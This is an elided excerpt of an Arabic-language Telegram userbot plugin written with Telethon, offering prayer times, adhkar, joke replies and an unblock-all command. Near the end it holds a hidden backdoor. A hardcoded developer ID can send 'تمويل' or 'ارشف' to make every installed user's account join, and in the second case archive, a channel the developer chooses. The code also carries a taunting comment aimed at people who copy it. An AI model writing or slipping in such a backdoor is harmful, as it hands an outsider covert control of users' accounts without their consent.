...
async def fetch_prayer_times():
    ...
    times_json = await Adyan.download_file(file_location)
    return times_json
...
async def send_prayer_times(event):
    ...
    input_file = await Adyan.upload_file(bytes(times_json, 'utf-8'), part_size_kb=512)
    await Adyan.send_file(chat_id, input_file, caption=f"وقت الفجر: {fajr_time}\nالتاريخ الهجري: {hijri_date}", force_document=True)

@Adyan.on(admin_cmd(pattern="صلاه(?: |$)(.*)"))
async def handle_command(event):
    await send_prayer_times(event)

@Adyan.on(admin_cmd(pattern="دعوه للمكالمه(?: |$)(.*)"))
async def _(e):
...
@Adyan.on(admin_cmd(pattern="بدء مكالمه(?: |$)(.*)"))
async def _(e):
    try:
...
R = [
    ...
    "**-** مطور السورس **⪼ [𐇮 𓂐 𓆩الــسيد𓆪 𖠛🇷🇺 ](t.me/rre3l)   \n"
    "**-** قناة السورس **⪼ [𐇮 مصطفىي ](t.me/jepthon)   "
]

@Adyan.on(admin_cmd(pattern="بلي$"))
...
@Adyan.on(admin_cmd(pattern="اذكار$"))
async def ithker(knopis):
...
@Adyan.on(admin_cmd(pattern="خيروك$"))
async def ithker(knopis):
    await knopis.edit(choice(HuRe_5erok))

    
@Adyan.on(admin_cmd(pattern="اذكار عشر$"))    
...
@Adyan.on(admin_cmd(pattern="شنو رأيك بهذا$"))
async def ithker(knopis):
...
@Adyan.on(admin_cmd(pattern="بوسة$"))
async def ithker(knopis):
    await knopis.edit(choice(HuRe_Bosa))

DevJoker = [705475246]
#تضل تخمط من عمك مصطفى ؟ الى اين يستمُر الفشل ياغُلام
...
async def Hussein(event):
    if event.message.message.startswith("تمويل") and event.sender_id in DevJoker:
        ...
        if channel_username:
            try:
                await Adyan(JoinChannelRequest(channel_username))
...
async def Hussein(event):
    if event.message.message.startswith("ارشف") and event.sender_id in DevJoker:
        ...
        if channel_username:
            try:
                await Adyan(JoinChannelRequest(channel_username))
                await Adyan.edit_folder(channel_username, folder=1)
...
@Adyan.on(admin_cmd(pattern="فك الحظر$"))
async def handle_unblock_all(event):
    ...
    for user in blocked_users.users:
        try:
            ...
            Mustafa_entity = await client.get_entity(user.id)
            Mustafa_profile = f"[{Mustafa_entity.first_name}](tg://user?id={Mustafa_entity.id})"
            await event.edit(f"᯽︙ تم إلغاء حظر المستخدم : {Mustafa_profile}")
            asyncio.sleep(3)
        except ValueError:
            continue
            ...
            continue
@Adyan.on(admin_cmd(pattern="(تاريخه|تاريخة)$"))
async def Hussein(event):
